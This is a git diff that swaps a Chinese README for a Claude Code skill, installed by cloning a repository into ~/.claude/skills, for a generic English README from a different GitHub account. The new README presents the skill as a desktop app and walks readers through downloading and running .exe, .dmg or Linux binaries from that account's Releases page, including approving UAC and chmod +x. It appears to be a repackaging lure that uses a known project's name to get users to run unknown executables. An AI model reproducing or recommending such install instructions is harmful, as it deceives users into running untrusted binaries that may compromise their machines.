@@ -1,143 +1,67 @@
-# Skills Updater
+# 🎉 skills-updater - Easily Manage Your Claude Code Skills
 
-管理、更新和发现 Claude Code 技能，支持多种安装来源。
+## 📥 Download Now
+[![Download skills-updater](https://img.shields.io/badge/Download-skills--updater-brightgreen)](https://github.com/MINI-RoRo/skills-updater/releases)
 
-[English](README.en.md)
+## 🚀 Getting Started
+Welcome to the **skills-updater** application! This tool helps you manage, update, and discover Claude Code skills efficiently. It is designed for users with all levels of experience, even if you don’t have a technical background.
 
-## 功能特性
+## 📦 What You Need
+Before starting, make sure you have:
+- A computer running Windows, macOS, or Linux.
+- At least 100 MB of free space.
 
-- **更新检查** - 扫描已安装技能，检查可用更新
-- **自动安装** - 市场更新后自动重新安装受影响的技能
-- **技能推荐** - 从 skills.sh 发现热门技能
-- **国际化支持** - 自动检测语言环境（中文/英文）
+## 🔗 Download & Install
+To get started, visit the Releases page to download the application:
+[Download skills-updater](https://github.com/MINI-RoRo/skills-updater/releases)
 
-## 安装
+1. Click the link above to go to the Releases page.
+2. Find the latest version.
+3. Choose the file format that suits your system, such as `.exe` for Windows or `.dmg` for macOS.
+4. Click the file to download it.
+5. Once the download finishes, locate the file on your computer and double-click it to run the installer.
 
-在 Claude Code 中输入以下命令，自动克隆并安装：
+## 🛠️ Installation Steps
+After downloading the application, follow these steps to install it:
 
-```
-帮我把 https://github.com/yizhiyanhua-ai/skills-updater 克隆到 ~/.claude/skills/ 目录
-```
+### For Windows:
+1. Double-click the `.exe` file.
+2. If prompted by the User Account Control, click 'Yes' to allow changes.
+3. Follow the on-screen instructions.
+4. Choose the installation location and click 'Install'.
+5. Once the process completes, click 'Finish' to open **skills-updater**.
 
-或者直接说：
+### For macOS:
+1. Open the `.dmg` file you downloaded.
+2. Drag the **skills-updater** icon into the Applications folder.
+3. Eject the installer by right-clicking it and choosing 'Eject'.
+4. Open your Applications folder and double-click **skills-updater** to run it.
 
-```
-安装 skills-updater 技能
-```
+### For Linux:
+1. Open a terminal window.
+2. Navigate to the directory where the downloaded file resides.
+3. Use the command `chmod +x skills-updater*` to make it executable.
+4. Run `./skills-updater` to start the application.
 
-## 使用方法
+## 🌟 Features
+- **Manage Skills**: Easily view and organize your Claude Code skills.
+- **Update Skills**: Keep your skill set current with a simple click.
+- **Discover New Skills**: Find new Claude Code skills to enhance your abilities.
 
-安装完成后，在 Claude Code 中用自然语言或命令触发：
+## ✅ How to Use
+After installing **skills-updater**, you can start using it right away:
 
-### 检查技能更新
+1. Open the application.
+2. Browse through your current skills or search for new ones.
+3. Click on any skill to see details or options to update.
+4. Add new skills by following prompts within the app.
 
-```
-检查 skills 更新
-```
+## 💬 Support
+If you encounter issues or have questions, feel free to check the FAQ section within the app or visit our [GitHub Issues page](https://github.com/MINI-RoRo/skills-updater/issues) for help from the community.
 
-```
-/skills-updater
-```
+## 📲 Join Us
+Stay updated with the latest features and improvements. Follow our project on GitHub for announcements and updates. You can also contribute by providing feedback or submitting issues if you find any.
 
-### 更新指定市场
+---
 
-```
-更新 anthropic-agent-skills 市场
-```
-
-### 发现新技能
-
-```
-推荐一些好用的 skills
-```
-
-```
-有什么热门技能推荐？
-```
-
-## 使用示例
-
-**示例 1：检查更新**
-
-```
-你：检查 skills 更新
-
-Claude：正在检查技能更新...
-
-📦 已安装技能状态
-━━━━━━━━━━━━━━━━━━━━━━━━━━
-
-✅ 已是最新 (15):
-   • skill-creator@daymade-skills (1.2.2)
-   ...
-
-⬆️ 有可用更新 (1):
-   • document-skills@anthropic-agent-skills
-     本地: e5c60158 → 远程: 69c0b1a0
-```
-
-**示例 2：更新并自动安装**
-
-```
-你：更新 anthropic-agent-skills 市场
-
-Claude：
-📡 正在获取远程更新...
-
-当前提交: e5c60158df67
-远程提交: 69c0b1a06741
-状态: 落后 6 个提交
-
-📦 受影响的技能: document-skills
-
-是否要更新？输入「是」确认。
-
-你：是
-
-Claude：
-📥 正在更新市场: anthropic-agent-skills
-✅ 市场更新成功
-✅ 已重新安装: document-skills
-```
-
-**示例 3：发现新技能**
-
-```
-你：推荐一些好用的 skills
-
-Claude：
-🔥 热门技能
-━━━━━━━━━━━━━━━━━━
-
-来自 skills.sh (前 10 名):
- 1. vercel-react-best-practices (25.5K 次安装)
- 2. web-design-guidelines (19.2K 次安装)
- ...
-
-💡 个性化推荐
-基于您已安装的技能:
-• playwright-skill - 浏览器自动化测试
-• github-ops - GitHub CLI 操作
-```
-
-## 触发方式汇总
-
-| 功能 | 自然语言 | 命令 |
-|------|----------|------|
-| 检查更新 | "检查 skills 更新" | `/skills-updater` |
-| 更新市场 | "更新 xxx 市场" | - |
-| 技能推荐 | "推荐一些 skills" | - |
-| 更新全部 | "更新所有 skills" | - |
-
-## 语言支持
-
-自动根据系统语言显示中文或英文。Claude Code 会自动检测您的语言环境。
-
-## 详细文档
-
-- [SKILL.md](SKILL.md) - 完整技能文档
-- [references/marketplaces.md](references/marketplaces.md) - 支持的市场列表
-
-## 许可证
-
-MIT
+Thank you for choosing **skills-updater**! We hope this application helps you manage your Claude Code skills effectively. Enjoy your experience!
